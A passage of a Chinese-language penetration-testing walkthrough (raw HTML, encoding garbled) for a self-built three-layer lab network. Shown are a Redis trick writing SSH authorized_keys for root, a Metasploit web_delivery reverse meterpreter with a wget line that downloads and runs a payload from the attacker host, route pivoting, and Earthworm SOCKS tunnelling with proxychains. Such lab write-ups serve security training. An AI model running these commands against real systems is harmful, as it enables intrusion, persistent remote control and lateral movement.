number">192.168</span>.52.4config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.sshconfig <span class="token builtin class-name">set</span> dbfilename authorized_keyssave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.23.29.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.29.32.png" style="zoom:40%;"><p>bingoï¼æˆåŠŸè·å–åˆ°web1é¶æœºçš„rootæƒé™ã€‚</p><h2 id="5-4-ä¿¡æ¯æ”¶é›†"><a href="#5-4-ä¿¡æ¯æ”¶é›†" class="headerlink" title="5.4 ä¿¡æ¯æ”¶é›†"></a>5.4 ä¿¡æ¯æ”¶é›†</h2><p>æ‹¿ä¸‹çš„è¿™å°192.168.43.253çš„æœåŠ¡å™¨ï¼Œè¿˜æœ‰å¦å¤–ä¸€ä¸ªip 192.168.52.10ã€‚</p><p>ä¹‹å‰é€šè¿‡Laravel RCE+å®¹å™¨é€ƒé€¸æ‹¿ä¸‹çš„é‚£å°æœºå­æ˜¯ubuntu14.04çš„ç³»ç»Ÿï¼Œä¸¤å—ç½‘å¡çš„ipåˆ†åˆ«æ˜¯192.168.52.20å’Œ192.168.93.10ã€‚ä½†æˆ‘ä»¬ä¹‹å‰è®¿é—®Laravel webæœåŠ¡çš„æ—¶å€™ï¼Œipæ˜¯192.168.43.253ï¼Œåˆ†æ43.253è¿™å°æœºå™¨æ˜¯ä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ã€‚</p><blockquote><h4 id="Nginx-çš„-conf-d-ç›®å½•ç”¨é€”åŠä¸-nginx-conf-çš„å…³ç³»ï¼š"><a href="#Nginx-çš„-conf-d-ç›®å½•ç”¨é€”åŠä¸-nginx-conf-çš„å…³ç³»ï¼š" class="headerlink" title="Nginx çš„ conf.d ç›®å½•ç”¨é€”åŠä¸ nginx.conf çš„å…³ç³»ï¼š"></a>Nginx çš„ <code>conf.d</code> ç›®å½•ç”¨é€”åŠä¸ <code>nginx.conf</code> çš„å…³ç³»ï¼š</h4><p><code>/etc/nginx/conf.d</code> ç›®å½•ç”¨äºå­˜å‚¨é¢å¤–çš„é…ç½®æ–‡ä»¶ï¼Œè¿™äº›é…ç½®æ–‡ä»¶é€šå¸¸åŒ…å«é’ˆå¯¹ç‰¹å®šç«™ç‚¹æˆ–æœåŠ¡çš„é…ç½®ï¼Œä½¿å¾— Nginx çš„ä¸»é…ç½®æ–‡ä»¶æ›´åŠ ç®€æ´å’Œæ¨¡å—åŒ–ã€‚å…·ä½“ç”¨é€”å¦‚ä¸‹ï¼š</p><ul><li><p><strong>æ¨¡å—åŒ–é…ç½®</strong>ï¼š<code>/etc/nginx/conf.d</code> ç›®å½•ç”¨äºå­˜å‚¨é¢å¤–çš„é…ç½®æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶é€šå¸¸ä»¥ <code>.conf</code> ç»“å°¾ï¼Œä¾‹å¦‚ <code>default.conf</code>ã€‚è¿™ç§æ¨¡å—åŒ–é…ç½®æ–¹å¼ä½¿å¾—æ¯ä¸ªé…ç½®æ–‡ä»¶å¯ä»¥ç‹¬ç«‹é…ç½®ç‰¹å®šçš„ç«™ç‚¹æˆ–æœåŠ¡ï¼Œä»è€Œè®©ä¸»é…ç½®æ–‡ä»¶æ›´åŠ ç®€æ´å’Œæ˜“äºç®¡ç†ã€‚</p></li><li><p><strong>åŒ…å«æœºåˆ¶</strong>ï¼šNginx çš„ä¸»é…ç½®æ–‡ä»¶ <code>/etc/nginx/nginx.conf</code> é€šå¸¸ä¼šåŒ…å« <code>/etc/nginx/conf.d</code> ç›®å½•ä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ <code>include</code> æŒ‡ä»¤ã€‚ä¾‹å¦‚ï¼š</p><p>nginxå¤åˆ¶</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">include</span> /etc/nginx/conf.d/*.conf</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·ï¼ŒNginx åœ¨å¯åŠ¨æ—¶ä¼šæŒ‰ç…§æ–‡ä»¶åçš„å­—æ¯é¡ºåºåŠ è½½ <code>/etc/nginx/conf.d</code> ç›®å½•ä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œå¹¶å°†å®ƒä»¬åˆå¹¶æˆä¸€ä¸ªå®Œæ•´çš„é…ç½®ã€‚</p></li></ul></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/nginx/nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.40.26.png" style="zoom:50%;"><p>ä¸»é…ç½®æ–‡ä»¶è¿˜åŒ…å«äº†conf.dä¸‹çš„å­é…ç½®æ–‡ä»¶ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.41.47.png" style="zoom:40%;"><blockquote><h4 id="é…ç½®è§£æï¼š"><a href="#é…ç½®è§£æï¼š" class="headerlink" title="é…ç½®è§£æï¼š"></a>é…ç½®è§£æï¼š</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen <span class="token number">81</span><span class="token punctuation">;</span>             <span class="token comment"># ç›‘å¬ç«¯å£ 81ï¼Œè¿™æ„å‘³ç€ Nginx å°†åœ¨è¿™ä¸ªç«¯å£ä¸Šæ¥æ”¶è¿›æ¥çš„ HTTP è¯·æ±‚ã€‚</span>    server_name localhost<span class="token punctuation">;</span> <span class="token comment"># æŒ‡å®šæœåŠ¡å™¨åç§°ä¸º localhostï¼Œè¿™é€šå¸¸ç”¨äºæœ¬åœ°å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒã€‚</span>    location / <span class="token punctuation">{</span>           <span class="token comment"># å®šä¹‰ location å—ï¼Œå®ƒå†³å®šäº†å¦‚ä½•å¤„ç†å¯¹æœåŠ¡å™¨æ ¹è·¯å¾„ï¼ˆå³ä»¥ / å¼€å§‹çš„è·¯å¾„ï¼‰çš„è¯·æ±‚ã€‚</span>        proxy_pass http://192.168.52.20:8000<span class="token punctuation">;</span> <span class="token comment"># å°†è¯·æ±‚è½¬å‘åˆ°å†…éƒ¨ç½‘ç»œçš„ 192.168.52.20 æœåŠ¡å™¨çš„ 8000 ç«¯å£ã€‚</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬å·²ç»æ‹¿ä¸‹äº†ï¼š</p><ul><li>DMZåŒºçš„ä¸€å°æœåŠ¡å™¨ï¼ˆ192.168.43.253ï¼Œ192.168.52.10ï¼‰</li><li>äºŒå±‚ç½‘ç»œçš„ä¸€å°æœåŠ¡å™¨ï¼ˆ192.168.52.20ï¼Œ192.168.93.10ï¼‰</li></ul><h1 id="å…­ã€éš§é“æ­å»ºï¼ˆäºŒå±‚ç½‘ç»œæ¸—é€ï¼‰"><a href="#å…­ã€éš§é“æ­å»ºï¼ˆäºŒå±‚ç½‘ç»œæ¸—é€ï¼‰" class="headerlink" title="å…­ã€éš§é“æ­å»ºï¼ˆäºŒå±‚ç½‘ç»œæ¸—é€ï¼‰"></a>å…­ã€éš§é“æ­å»ºï¼ˆäºŒå±‚ç½‘ç»œæ¸—é€ï¼‰</h1><p>ç›®å‰æ”»å‡»æœºåªèƒ½pingé€šDMZåŒºçš„ä¸»æœºï¼Œæ— æ³•pingé€šäºŒå±‚ç½‘ç»œï¼ˆ192.168.52.20/24ï¼‰çš„ä¸»æœºã€‚å¦‚ä½•æŠŠæˆ‘ä»¬çš„å·¥å…·å¸¦å…¥å†…ç½‘å‘¢ï¼Ÿæ¯”å¦‚å¦‚ä½•ç›´æ¥æ‹¿kaliä¸Šçš„nmapæ‰«192.168.52.0/24ç½‘æ®µçš„ä¸»æœºï¼Ÿè¿™å°±è¦ç”¨åˆ°éš§é“æ­å»ºæŠ€æœ¯äº†ã€‚</p><p>å…³äºEWå’Œproxychainsçš„ä½¿ç”¨æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒæœ¬ç«™çš„ã€ŠEarthworm-éš§é“æ­å»ºã€‹ä¸€æ–‡ã€‚</p><h2 id="6-1-é€šè¿‡è®¾ç½®è·¯ç”±å°†msfconsoleå¸¦å…¥å†…ç½‘ä½¿ç”¨"><a href="#6-1-é€šè¿‡è®¾ç½®è·¯ç”±å°†msfconsoleå¸¦å…¥å†…ç½‘ä½¿ç”¨" class="headerlink" title="6.1 é€šè¿‡è®¾ç½®è·¯ç”±å°†msfconsoleå¸¦å…¥å†…ç½‘ä½¿ç”¨"></a>6.1 é€šè¿‡è®¾ç½®è·¯ç”±å°†msfconsoleå¸¦å…¥å†…ç½‘ä½¿ç”¨</h2><p>é€šè¿‡è·å–web1çš„metepreterçš„shellï¼Œç„¶åé€šè¿‡è·¯ç”±è®¾ç½®å¯ä»¥å°†msfconsoleå¸¦å…¥å†…ç½‘ï¼ˆä½†æ˜¯å…¶ä»–çš„å·¥å…·æƒ³è¦å¸¦å…¥å†…ç½‘è¿˜æ˜¯è¦æ­å»ºéš§é“ï¼‰ã€‚</p><ul><li>web1ä¸Šçº¿meterpreter</li></ul><p>ä½¿ç”¨ msf exploit/multi/script/web_deliveryæ¨¡å—åˆ›å»ºåå¼¹shellçš„payloadï¼ŒæŠ•é€’åˆ°DMZå—æ§ä¸»æœºä¸­ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.43.26<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> SRVPORT <span class="token number">9090</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨web1ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> xDfaOgFL --no-check-certificate http://192.168.43.26:9090/plurgt4DqlP<span class="token punctuation">;</span> <span class="token function">chmod</span> +x xDfaOgFL<span class="token punctuation">;</span> ./xDfaOgFL<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.54.38.png" style="zoom:67%;"><p> æ‰§è¡Œä¹‹åä¸Šçº¿meterpreterï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.55.00.png" style="zoom:40%;"><ul><li>è®¾ç½®è·¯ç”±</li></ul><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.56.25.png" style="zoom:50%;"><p>é€šè¿‡æ·»åŠ è·¯ç”±å¯ä»¥å°†msfconsoleè·¯ç”±åˆ°å†…ç½‘ä¸­ã€‚å°†msfconsoleçš„æµé‡ä»sessions 1è·¯ç”±åˆ°192.168.52.0/24ç½‘æ®µã€‚</p><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨metasploitçš„ auxiliary/scanner/discovery/udp_probe æ¨¡å—æ¥æ‰«æç¬¬äºŒå±‚ç½‘ç»œä¸­çš„ä¸»æœºå­˜æ´»ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.1-255<span class="token builtin class-name">set</span> threads <span class="token number">5</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.03.09.png" style="zoom:50%;"><p>â€‹       æˆåŠŸæ¢æµ‹åˆ°ä¸€å°è®¡ç®—æœºï¼š192.168.52.30.</p><h2 id="6-2-æ”»å‡»æœºé€šè¿‡EWéš§é“ç›´æ¥æ¢æµ‹äºŒå±‚ç½‘ç»œ"><a href="#6-2-æ”»å‡»æœºé€šè¿‡EWéš§é“ç›´æ¥æ¢æµ‹äºŒå±‚ç½‘ç»œ" class="headerlink" title="6.2 æ”»å‡»æœºé€šè¿‡EWéš§é“ç›´æ¥æ¢æµ‹äºŒå±‚ç½‘ç»œ"></a>6.2 æ”»å‡»æœºé€šè¿‡EWéš§é“ç›´æ¥æ¢æµ‹äºŒå±‚ç½‘ç»œ</h2><p>è™½ç„¶é€šè¿‡è·¯ç”±è®¾ç½®å¯ä»¥å°†msfconsoleå¸¦å…¥å†…ç½‘ï¼Œä½†æ˜¯å…¶ä»–çš„å·¥å…·æƒ³è¦å¸¦å…¥å†…ç½‘è¿˜æ˜¯è¦æ­å»ºéš§é“ã€‚</p><h3 id="6-2-1-ç¯å¢ƒæ¢³ç†"><a href="#6-2-1-ç¯å¢ƒæ¢³ç†" class="headerlink" title="6.2.1 ç¯å¢ƒæ¢³ç†"></a>6.2.1 ç¯å¢ƒæ¢³ç†</h3><p>ä»æ”»å‡»è€…çš„è§†è§’çœ‹ï¼Œç›®å‰çš„ç½‘ç»œç¯å¢ƒå¤§è‡´å¦‚ä¸‹ï¼š</p><p>ã€æ”»å‡»æœº192.168.43.26ã€‘â€”â€”&gt;ã€DMZ 192.168.43.253ï½œ192.168.52.10)ã€‘â€”â€”&gt;ã€äºŒå±‚ 192.168.52.20ï½œ192.168.93.10ã€‘</p><p>è¿™é‡Œæ˜¯åœ¨æœ¬æœºæ­å»ºçš„ç¯å¢ƒï¼Œåœ¨å®é™…æ”»å‡»åœºæ™¯ä¸­æ”»å‡»æœºä¸€èˆ¬æ˜¯äº’è”ç½‘ä¸Šä¸€å°æ‹¥æœ‰å…¬ç½‘ipçš„VPSï¼ŒDMZå¯¹å¤–çš„IPä¹Ÿæ˜¯äº’è”ç½‘IPã€‚</p><p>éœ€æ±‚ï¼šå»ºç«‹æ”»å‡»æœºå’ŒäºŒå±‚ä¸»æœºçš„éš§é“ï¼Œå®ç°ç›´æ¥åœ¨æ”»å‡»æœºä¸­ä½¿ç”¨nmapå¯¹äºŒå±‚ç½‘ç»œä¸­çš„ä¸»æœºè¿›è¡Œæ‰«æã€‚</p><h3 id="6-2-2-æ”»å‡»æœºæ‰§è¡Œewå®¢æˆ·ç«¯"><a href="#6-2-2-æ”»å‡»æœºæ‰§è¡Œewå®¢æˆ·ç«¯" class="headerlink" title="6.2.2 æ”»å‡»æœºæ‰§è¡Œewå®¢æˆ·ç«¯"></a>6.2.2 æ”»å‡»æœºæ‰§è¡Œewå®¢æˆ·ç«¯</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><ul><li><code>-s rcsocks</code>ï¼šæŒ‡å®šä½¿ç”¨ <code>rcsocks</code> æ¨¡å¼ã€‚<code>rcsocks</code> æ¨¡å¼æ˜¯ Earthworm çš„ SOCKS ä»£ç†æ¨¡å¼ï¼Œå®ƒåˆ›å»ºä¸€ä¸ª SOCKS æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ï¼Œå¹¶å°†è¿™äº›è¿æ¥è½¬å‘åˆ°è¿œç¨‹çš„ SOCKS æœåŠ¡å™¨ã€‚</li><li><code>-l 1080</code>ï¼šæŒ‡å®šæœ¬åœ°ç›‘å¬ç«¯å£ä¸º 1080ã€‚è¿™æ„å‘³ç€ Earthworm å°†åœ¨æœ¬åœ°è®¡ç®—æœºçš„ 1080 ç«¯å£ä¸Šç›‘å¬è¿›æ¥çš„ SOCKS ä»£ç†è¯·æ±‚ã€‚</li><li><code>-e 1234</code>ï¼šæŒ‡å®šè¿œç¨‹ SOCKS æœåŠ¡å™¨çš„ç«¯å£ä¸º 1234ã€‚è¿™æ„å‘³ç€æ‰€æœ‰é€šè¿‡æœ¬åœ° SOCKS æœåŠ¡å™¨ï¼ˆç›‘å¬åœ¨ 1080 ç«¯å£ï¼‰çš„æµé‡éƒ½å°†è¢«è½¬å‘åˆ°è¿œç¨‹ SOCKS æœåŠ¡å™¨çš„ 1234 ç«¯å£ã€‚</li></ul></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.04.59.png" style="zoom:50%;"><h3 id="6-2-3-DMZå—æ§ä¸»æœºæ‰§è¡ŒewæœåŠ¡ç«¯ï¼ˆweb1ï¼‰"><a href="#6-2-3-DMZå—æ§ä¸»æœºæ‰§è¡ŒewæœåŠ¡ç«¯ï¼ˆweb1ï¼‰" class="headerlink" title="6.2.3 DMZå—æ§ä¸»æœºæ‰§è¡ŒewæœåŠ¡ç«¯ï¼ˆweb1ï¼‰"></a>6.2.3 DMZå—æ§ä¸»æœºæ‰§è¡ŒewæœåŠ¡ç«¯ï¼ˆweb1ï¼‰</h3><blockquote><p>ä¸Šä¼ ew_for_linux64</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.40.28.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> Desktop/ew_for_linux64 root@192.168.43.253:/home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.06.10.png" style="zoom:50%;"><p>ç”±äºå·²ç»è·å¾—äº†ssh rootæƒé™ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨scpå¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ç³»ç»Ÿä¸­ã€‚</p><blockquote><p>å¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.43.26 <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><ul><li><code>-s rssocks</code>ï¼šæŒ‡å®šä½¿ç”¨ <code>rssocks</code> æ¨¡å¼ã€‚<code>rssocks</code> æ¨¡å¼ç”¨äºåˆ›å»ºä¸€ä¸ª SOCKS æœåŠ¡ç«¯ï¼Œå®ƒå°†æ¥æ”¶æ¥è‡ªè¿œç¨‹ SOCKS å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œå¹¶å°†è¿™äº›è¿æ¥è½¬å‘åˆ°æœ¬åœ°çš„ç‰¹å®šç«¯å£ã€‚</li><li><code>-d 192.168.1.7</code>ï¼šæŒ‡å®šç›®æ ‡ä¸»æœºçš„ IP åœ°å€ä¸º <code>192.168.1.7</code>ã€‚è¿™æ„å‘³ç€ Earthworm å°†å°è¯•è¿æ¥åˆ°è¿™ä¸ª IP åœ°å€ä¸Šçš„ SOCKS å®¢æˆ·ç«¯ã€‚</li><li><code>-e 1234</code>ï¼šæŒ‡å®šæœ¬åœ°è½¬å‘ç«¯å£ä¸º 1234ã€‚è¿™æ„å‘³ç€æ‰€æœ‰é€šè¿‡è¿œç¨‹ SOCKS å®¢æˆ·ç«¯çš„æµé‡éƒ½å°†è¢«è½¬å‘åˆ°æœ¬åœ°çš„ 1234 ç«¯å£ã€‚</li></ul></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.42.40.png" style="zoom:50%;"><h3 id="6-2-4-æ”»å‡»æœºè®¾ç½®proxychains"><a href="#6-2-4-æ”»å‡»æœºè®¾ç½®proxychains" class="headerlink" title="6.2.4 æ”»å‡»æœºè®¾ç½®proxychains"></a>6.2.4 æ”»å‡»æœºè®¾ç½®proxychains</h3><blockquote><h4 id="ä»€ä¹ˆæ˜¯proxychains"><a href="#ä»€ä¹ˆæ˜¯proxychains" class="headerlink" title="ä»€ä¹ˆæ˜¯proxychains"></a>ä»€ä¹ˆæ˜¯proxychains</h4><p>Proxychains æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œå®ƒå…è®¸ä½ é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªä»£ç†æœåŠ¡å™¨æ¥è¿è¡Œä½ çš„åº”ç”¨ç¨‹åºã€‚å®ƒé€šè¿‡åŠ«æŒåº”ç”¨ç¨‹åºçš„ç½‘ç»œè¯·æ±‚ï¼Œå¹¶å°†è¿™äº›è¯·æ±‚é€šè¿‡é…ç½®çš„ä»£ç†é“¾å‘é€å‡ºå»ï¼Œä»è€Œå®ç°ç½‘ç»œæµé‡çš„ä»£ç†ã€‚</p><p>ProxyChainsæ˜¯Linuxå’Œå…¶ä»–Unicesä¸‹çš„ä»£ç†å·¥å…·ã€‚å®ƒå¯ä»¥ä½¿ä»»ä½•ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œå…è®¸TCPå’ŒDNSé€šè¿‡ä»£ç†éš§é“ï¼Œæ”¯æŒHTTPã€SOCKS4å’ŒSOCKS5ç±»å‹çš„ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¯é…ç½®å¤šä¸ªä»£ç†ã€‚</p><p>è®¾ç½®ProxyChainsçš„å…·ä½“æ“ä½œæ­¥éª¤å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>1ï¼‰æ‰“å¼€ProxyChainsé…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ï¼‰æ·»åŠ ä»£ç†æœåŠ¡å™¨</p><p>åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œæ‰¾åˆ° <code>[ProxyList]</code> éƒ¨åˆ†ï¼Œå¹¶æ·»åŠ ä½ çš„ä»£ç†æœåŠ¡å™¨ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹é…ç½®ï¼š</p><p><strong>SOCKS5 ä»£ç†</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.100 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>HTTP ä»£ç†</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">http 192.168.1.101 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SOCKS4 ä»£ç†</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">socks4 192.168.1.102 9050<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½ å¯ä»¥æ·»åŠ å¤šä¸ªä»£ç†ï¼ŒProxychains ä¼šæ ¹æ®é…ç½®çš„è§„åˆ™ä½¿ç”¨è¿™äº›ä»£ç†ã€‚</p><p>3ï¼‰é…ç½®ä»£ç†é“¾æ¨¡å¼</p><p>åœ¨é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨ï¼Œä½ å¯ä»¥é€‰æ‹©ä¸åŒçš„ä»£ç†é“¾æ¨¡å¼ï¼š</p><p>åŠ¨æ€é“¾ (<code>dynamic_chain</code>)ï¼šProxychains å°†æŒ‰é¡ºåºå°è¯•æ¯ä¸ªä»£ç†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå·¥ä½œçš„ä»£ç†ã€‚</p><p>ä¸¥æ ¼é“¾ (<code>strict_chain</code>)ï¼šProxychains å°†æŒ‰é¡ºåºå°è¯•æ¯ä¸ªä»£ç†ï¼Œå¦‚æœä¸€ä¸ªä»£ç†å¤±è´¥ï¼Œå®ƒå°†åœæ­¢å°è¯•ã€‚</p><p>ä¾‹å¦‚ï¼Œè¦å¯ç”¨åŠ¨æ€é“¾æ¨¡å¼ï¼Œä½ å¯ä»¥åœ¨é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨æ·»åŠ æˆ–ç¡®ä¿ä»¥ä¸‹è¡Œæœªè¢«æ³¨é‡Šï¼ˆå³æ²¡æœ‰ <code>#</code> åœ¨è¡Œé¦–ï¼‰ï¼š</p><pre class="line-numbers language-none"><code class="language-none">dynamic_chain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4ï¼‰ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨</p><p>ä¿å­˜æ›´æ”¹å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ <code>nano</code>ï¼Œå¯ä»¥æŒ‰ <code>Ctrl + X</code>ï¼Œç„¶åæŒ‰ <code>Y</code> ç¡®è®¤ä¿å­˜æ›´æ”¹ï¼Œæœ€åæŒ‰ <code>Enter</code> ä¿å­˜æ–‡ä»¶ã€‚</p><p>5ï¼‰ä½¿ç”¨ Proxychains</p><p>ç°åœ¨ï¼Œä½ å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤å‰åŠ ä¸Š <code>proxychains</code> æ¥ä½¿ç”¨ Proxychainsã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <code>proxychains</code> è¿è¡Œ <code>curl</code> å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°†é€šè¿‡ä½ é…ç½®çš„ä»£ç†æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚</p></blockquote><p>ä¿®æ”¹ä¹‹å‰çš„é…ç½®ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.09.08.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.57.png" alt="åŸé…ç½®" style="zoom:50%;"><p>ä¿®æ”¹åçš„é…ç½®ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.56.34.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.09.49.png" style="zoom:50%;"><p>ä¹‹åä¾¿å¯ä»¥ä½¿ç”¨proxychainså°†æˆ‘ä»¬æ”»å‡»æœºä¸Šçš„ç¨‹åºä»£ç†è¿›ç¬¬äºŒå±‚ç½‘ç»œï¼ˆ192.168.52.1/24ï¼‰äº†ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.10.59.png" style="zoom:50%;"><p>æ­£å¸¸æƒ…å†µä¸‹pingå†…ç½‘ä¸»æœºæ˜¯æ— æ³•pingé€šçš„ï¼Œä½†æ˜¯proxychainsä¸æ”¯æŒicmpåè®®ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æ³•ä½¿ç”¨è¯¸å¦‚proxychains4 ping 